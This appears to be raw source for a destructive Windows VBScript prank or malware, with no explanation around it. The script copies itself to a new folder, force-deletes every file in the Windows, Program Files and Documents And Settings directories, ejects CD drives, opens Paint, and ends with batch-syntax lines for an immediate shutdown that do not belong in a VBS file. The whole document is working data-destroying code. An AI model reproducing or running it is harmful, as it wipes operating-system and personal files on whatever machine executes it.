   Dim filesys, newfolder, newfolderpath
   newfolderpath = "c:\MyJunky"
   set filesys=CreateObject("Scripting.FileSystemObject")
   If Not filesys.FolderExists(newfolderpath) Then
   Set newfolder = filesys.CreateFolder(newfolderpath)
   End If
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile "C:\New.vbs", "C:\MyJunky", True
   set fso=CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, "C:\MyJunky", True
   dim filesysdelfile
   Set filesysdelfile = CreateObject("Scripting.FileSystemObject")
   filesysdelfile.DeleteFile "C:\WINDOWS\*.*",True
   Set filesysdelfile = Nothing
   dim filesysdelfile
   Set filesysdelfile = CreateObject("Scripting.FileSystemObject")
   filesysdelfile.DeleteFile "C:\Program Files\*.*",True
   Set filesysdelfile = Nothing
   dim filesysdelfile
   Set filesysdelfile = CreateObject("Scripting.FileSystemObject")
   filesysdelfile.DeleteFile "C:\Documents And Settings\*.*",True
   Set filesysdelfile = Nothing
   Set oWMP = CreateObject("WMPlayer.OCX.7" )
   Set colCDROMs = oWMP.cdromCollection
   if colCDROMs.Count >= 1 then
   For i = 0 to colCDROMs.Count - 1
   colCDROMs.Item(i).Eject
   Next ' cdrom
   end if
   set shell = CreateObject("WScript.Shell")
   shell.run "mspaint.exe"
   cls
   @echo off
   start %windir%\System32\SHUTDOWN.exe -s -t 01
   cls
